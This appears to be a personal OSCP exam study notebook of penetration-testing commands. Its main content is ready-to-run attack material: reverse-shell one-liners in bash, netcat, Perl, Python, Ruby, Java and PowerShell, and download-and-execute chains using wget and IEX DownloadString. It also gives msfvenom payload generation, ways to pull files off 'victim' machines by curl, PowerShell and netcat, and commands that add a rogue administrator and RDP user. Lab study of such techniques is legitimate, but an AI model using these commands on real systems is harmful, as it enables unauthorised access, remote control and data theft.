# Useful Stuff 🛠️

This section of the OSCPNoteBook contains a collection of handy techniques, commands, and references that I found particularly useful throughout my journey.

## Table of Contents

- [File Sharing](#file-sharing)
- [Shells](#shells)
- [Everyday Bash One-Liners](#everyday-bash-one-liners)
- [Python2 VENV](#python2-venv)
- [Compiling Exploits](#compiling-exploits)
- [Cross-Compiling with Docker](#cross-compiling-with-docker)
- [Wordlists](#wordlists)
- [Adding RDP Users](#adding-rdp-users)
- [Executing Remote Scripts](#executing-remote-scripts)

## File Sharing
**Details and techniques related to file sharing, including protocols, tools, and best practices.**
*Note*:  I have created my own tool, [SecSwap](https://github.com/0xP1ckl3d/SecSwap), that uses a client/server model to securely exchange files over HTTP.
### Uploading From Attack Machine to Victim Machine
#### Netcat
On the receiving machine we set up a listener:
```bash
nc -nlvp 4444 > incoming.zip
```
From Kali we can send the file with:
```bash
nc –nv <IP> 4444 < outgoing.zip
```
#### HTTP:
**Options to start an HTTP server from attack machine:**
````bash
python2 -m SimpleHTTPServer <port>
sudo updog -p 80
python3 -m http.server <port>
php -S 0.0.0.0:<port>
ruby -run -e httpd . -p <port>
busybox httpd -f -p <port>
secswap server -p <port>
```
Host a stable server on port 80 within /var/www/html/
```bash
sudo systemctl restart apache2
````
**Options to pull file from Victim Machine:**
**Linux:**
```bash
wget [http://ip-addr:port/file] -o output-file
curl [http://ip-addr:port/file] -o output-file
echo "GET /[file] HTTP/1.0" | nc -n [ip-addr port] > out-file && sed -i '1,7d' [out-file]
secswap client -s [server address] -p [port number] -ls [optional directory]
```
**Windows**
Certutil:
```bash
certutil -urlcache -split -f "http://ip-addr:port/file" output-file
# OR
certutil.exe -urlcache -split -f "http://ip-addr:port/file" output-file
```
Powershell:
```bash
powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')
# OR
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
```
#### FTP
To Host an FTP server from Kali, run:
```bash
python -m pyftpdlib -p 2121
# OR to open ftp port 22 run
sudo service pure-ftpd start
```
From Linux Victim, to pull all recursively:
```bash
wget -r ftp://anonymous:anonymous@192.168.119.244:212
```
From Victim with non-interactive shell, run the following commands to build a file:
```bash
echo open <ip-addr> > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET [file.exe] >> ftp.txt
echo bye >> ftp.txt
# Send File:
ftp -v -n -P 2121 -s:ftp.txt
```
FTP one-liner:
```bash
echo open 192.168.119.145 >> ftp &echo user anonymous anonymous >> ftp &echo binary >> ftp &echo get rsh.exe >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp
```
#### SCP:
*Only available if we have the Victims SSH credentials!*
From Kali (send file to Victim):
```bash
scp <options> <file> <user>@<Victim_IP>:~/path/to/file
```
From Kali (pull file from Victim):
```bash
scp <options> <user>@<Victim_IP>:~/path/to/file <file>
```
#### SMB
From Kali folder hosting files:
```
impacket-smbserver share ./
```
From Victim (*example; execute the nc.exe file hosted in the share on the local server*):
```bash
\\10.10.14.45\share\nc.exe -e cmd.exe 10.10.14.45 8080
```
### Pulling From Victim Machine to Attack Machine
#### Netcat
On Kali we set up a listener:
```bash
nc –nlvp 4444 > incoming.zip
```
From Victim Machine we can send the file with:
```bash
netcat.exe –nv <IP> 4444 < outgoing.zip
```
#### HTTP/CURL:
To pull a file from a Victim machine we can spin up an Updog server:
```bash
sudo updog -p 80
```
Then on the Victim machine use curl to upload the file to our host machine:
```bash
curl -v -XPOST -F "file=@in.txt;filename=out.txt" -F "path=." http://<Kali_IP>/upload
```
#### HTTP SecSwap
On Victim machine (must have python3 and required libraries) we can start a server:
```bash
./secswap server -p 8080 -a
```
On Attack machine we can download:
```bash
./secswap client -s [server address] -p [port number] -ls [optional directory] -a
```
*`-a` allows for password authentication during file transfer*
#### HTTP/Powershell:
**Windows**
In Kali (SETTING UP ENVIRONMENT):
```bash
cd /var/www/html
sudo nano  upload.php
```
```php
<?php
$uploaddir = '/current/directory/path';
		
$uploadfile = $uploaddir . $_FILES['file']['name'];
		
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```
```bash
sudo mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads
```
Uploading file from Windows:
```bash
powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```
#### SCP:
Start SSH service on Kali:
```bash
sudo systemctl start ssh
```
From Victim machine run:
```bash
scp in.txt kali@<Kali_IP>:~/path/to/file
```
#### TFTP:
Host TFTP server in Kali:
```bash
atftpd --daemon --port 69 root-dir
```
From Victim (Won't work on newer Windows Systems):
```bash
tftp -i ip-addr {GET | PUT} file
```
#### FTP:
To open FTP Port from current directory in Kali with write access run:
```bash
python -m pyftpdlib -p 2121 -w -u user -P pass
```
Or to open ftp port 22 run:
```bash
sudo service pure-ftpd start
```
From Victim with non-interactive shell, run the following commands to build a file:
```bash
echo open <ip-addr> > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET [file.exe] >> ftp.txt
echo bye >> ftp.txt
# Send File:
ftp -v -n -P 2121 -s:ftp.txt
```
FTP one-liner:
```bash
echo open 192.168.119.145 >> ftp &echo user anonymous anonymous >> ftp &echo binary >> ftp &echo get rsh.exe >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp
```
If Victim is running an FTP service with known credentials or with anonymous:anonymous we can copy and serve files using filezilla GUI
#### MANNUAL OPTION (Copy & paste):
If file is binary we can encode it on the Victim machine first:
```bash
python -c 'print(__import__("base64").b64encode(open("file", "rb").read()))'
```
On Kali:
```bash
base64 -d output.txt > output-file
```

## Shells
Different methods to obtain and upgrade shells, including reverse shells, bind shells, and more.
* [Generate reverse shell one-liners](https://revshells.com)
* [PayloadsAllTheThings Reverse Shell cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [msfvenom cheatsheet](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
### MSFVENOM
Example usage:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.192 LPORT=1234 -f exe > shell.exe
```
List Available Payloads:
```bash
msfvenom -l payloads
```
List available formats:
```bash
msfvenom -l formats
```
`-e` encoder 
`-b` bad characters
`-f` format
`-p` payload
### NETCAT
In Kali:
```bash
nc -nlvp 4444 
```
In Victim
```bash
nc 192.168.1.1 4444 -e /bin/sh # (Linux) (or /bin/bash)
nc 192.168.1.1 4444 -e cmd.exe # (Windows)
```
### BASH
```bash
/bin/bash -i >& /dev/tcp/192.168.119.145/1234 0>&1
```
**Sometimes works over HTTP:**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.219 4444 >/tmp/f
```
### Create a shell file, download and execute one liner
On Attack:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.219 LPORT=443 -f elf -o shell
sudo updog -p 80
nc -lnvp 443
```
On Victim:
```
wget http://192.168.119.219/shell -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell
```
### Shell One-Liners
[Upgrade to reverse shell from webshell](https://w00troot.blogspot.com/2017/05/getting-reverse-shell-from-web-shell.html)
#### Perl
```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```bash
#### Python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
#### Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```
#### Java
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4321;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()
```
#### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4321).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'![image](https://github.com/0xP1ckl3d/OSCPNoteBook/assets/41103126/33577a3f-db8f-46df-a062-9a074c3884a2)
```
### Upgrading to fully interactive shells
Should be performed whenever in a netcat reverse shell
**Python**
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
**Socat**
In Kali:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
In Victim:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
*socat.bin and socat.exe  can be sent to Victim using file sharing.*
**To determine if you are on an x86 or x64:** 
In windows:
```bash
set programfile
```
In linux:
```
uname -m
```
#### Full TTY Options
[Cheatsheet](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)
**NOTE** - *DON'T DO WITH ZSH, CHANGE TO A SH SHELL FIRST*
In reverse shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL-Z
```
Whilst shell is in background:
```bash
stty raw -echo
fg
```
In reverse shell:
```bash
reset
xterm-256color
export SHELL=bash
export TERM=xterm-256color
stty rows 38 columns 116
```
**Windows 10 option using ConPtyShell**
[ConPtyShell](https://github.com/antonioCoco/ConPtyShell) (method 3 to upgrade shell)
Open Poweshell and enable script execution:
```bash
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```
In Kali, host the script:
```bash
python3 -m http.server 80
```
In second Kali terminal run:
```bash
stty size
nc -lvnp 3001
Wait For connection
ctrl+z
stty raw -echo; fg[ENTER]
```
In Windows run:
```bash
IEX(IWR http://192.168.119.145/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -Upgrade -Rows 70 -Cols 96
```
*Note: set the rows and column sizes to the output of `stty size`
**Nishang**
[Nishang](https://github.com/samratashok/nishang/tree/master/Shells)
One Liners:
```bash
$client = New-Object System.Net.Sockets.TCPClient('192.168.119.145',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```
**Upgrade to Interactive Powershell with Nishang Invoke-PowerShellTcp.ps1**
In Kali
Host Invoke-PowerShellTcp.ps1 on port 80 in one terminal.
```bash
python3 -m http.server 80
```
In a second terminal, start a reverse shell listener:
```bash
rlwrap nc -lvnp 4444
```
In the Windows non-interactive shell:
```bash
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.119.175/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.175 -Port 4444
```
**Alternatively**
In Kali:
```bash
sh
stty raw -echo; (stty size; cat) | rlwrap nc -lvnp 4444
```
In Windows:
```bash
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.119.175/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 192.168.119.175 4444
```
*Won't work if CreatePseudoConsole function doesn't exist!*

## Everyday Bash One-Liners
A collection of bash one-liners that have proven invaluable in various situations.
### Quickly display the Kali VPN IP Address
greping the tun0 address:
```bash
ip -f inet a | grep tun0 | awk '/inet / {print $2}' | cut -f 1 -d '/'
```
Alternatively, Save the following into ~/.zshrc
```bash
export MYIP=$(ip -f inet a | grep tun0 | awk '/inet / {print $2}' | cut -f 1 -d '/')
```
Then run:
```bash
echo $MYIP
```
Alternatively, create scripts containing the above oneliner and save in PATH as `tun0`
### Finding files
Search through all files in PATH (useful to check if a tool is installed):
```bash
which [FILE_NAME]
```
Search through locate database:
```
locate [FILE_NAME]
```
Search through entire filesystem recursively
```bash
find / -name [file_name] -type f 2>/dev/nul
```
_Note: Can use an * to indicate wildcard_

## Python2 VENV
Instructions and tips for setting up and working with Python2 Virtual Environments.
We often come across script written in Python2 relying on non-standard python2 libraries. It is a pain in the butt to try and install new python2 libraries on Kali and we could break pip by downgrading versions. Instead we can run python2 inside a venv and install the appropriate libraries as needed
### Setting up the venv (first-time only)
```bash
mkdir ~/opt && cd ~/opt
git clone https://github.com/SecureAuthCorp/impacket.git && cd impacket
virtualenv impacket-venv -p $(which python2)
```
We have now built a virtual environment where the main python version is python 2.7. We can enter the venv to confirm:
```bash
source ~/opt/impacket/impacket-venv/bin/activate
python -V
```
Now we can install pip for python2 within our virtual environment:
```bash
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python get-pip.py
```
### Entering and exiting the VENV
Once we have built our venv, on subsequent occasions, for running Python2 scripts that requires libraries not currently installed on Kali
```bash
source ~/opt/impacket/impacket-venv/bin/activate
```
When done:
```bash
deactivate
```

## Compiling Exploits
Steps and best practices for compiling exploits, ensuring compatibility and successful execution.
#### Repositories of precompiled exploits
*Use at own risk*
[Windows Kernel](https://github.com/SecWiki/windows-kernel-exploits)
[Linux Kernel (exploitdb)](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)
[Linux Kernel](https://github.com/lucyoa/kernel-exploits/)
#### C exploits for Linux
```bash
gcc -static in.c -o exploit
```
*Note: for 32-bit systems use`-m32`*
#### C Exploits for Windows
For x64 compile with: x86_64-w64-mingw32-gcc
For x86 compile with: i686-w64-mingw32-gcc
```bash
i686-w64-mingw32-gcc shell.c -o shell.exe!
```
#### C++ exploits for Linux
* `g++`
#### C++ exploits for Windows
* `i686-w64-mingw32-g++`
* `i686-w64-mingw32-g++-win32`
* `x86_64-w64-mingw32-g++`
* `x86_64-w64-mingw32-g++-win32`
#### C#
```bash
sudo chmod +x program.cs
mcs -out:program.exe program.cs
```

## Cross-Compiling with Docker
During the labs, I ran into the problem of several older Linux machines without compilers installed. Exploits compiled in Kali simply didn't work for various reasons.
* [Offsec forums discussion](https://forums.offensive-security.com/showthread.php?48259-Fix-for-incompatibility-with-older-versions-of-gcc-Kali-2022-3)
### Debian 10
Using a debian 10 docker image. This worked for me for most linux lab machines.
**Setup** (One time only - as **root**):
```bash
docker pull debian:10
mkdir ~/docker_shared
docker run --name debian10 -v ~/docker_shared:/media -it debian:10 /bin/bash
```
Inside the container run:
```bash
apt update && apt install gcc-multilib build-essential
```
**Usage after setup**
Entering the container:
```bash
docker start debian10
docker exec -it debian10 /bin/bash
```
Inside the docker, complie your files within /media and they will be accessable outside the docker in /root/docker_shared

## Wordlists
The most commonly used wordlists for OSCP and their locations within Kali.
* Passwords: /usr/share/wordlists/rockyou.txt
* Service Brute Force (short list): /usr/share/wfuzz/wordlist/others/common_pass.txt 
* Directory fuzzing: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

## Adding RDP Users
Quickly create new users and add them as administrator & RDP users. This is useful if you have administative command execution.
```bash
net user pwned Password123! /add
net localgroup administrators pwned /add
net localgroup "Remote Desktop Users" pwned /add
```
Enabling RDP in Windows if it is disabled (Requires Admin):
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

## Executing Remote Scripts
Methods for executing scripts remotely on target machines using SMB.
From Kali folder hosting files
```bash
impacket-smbserver share ./
```
From Victim (execute the nc file in the share on the local server)
```bash
\\10.10.14.45\share\nc.exe -e cmd.exe 10.10.14.45 8080
```
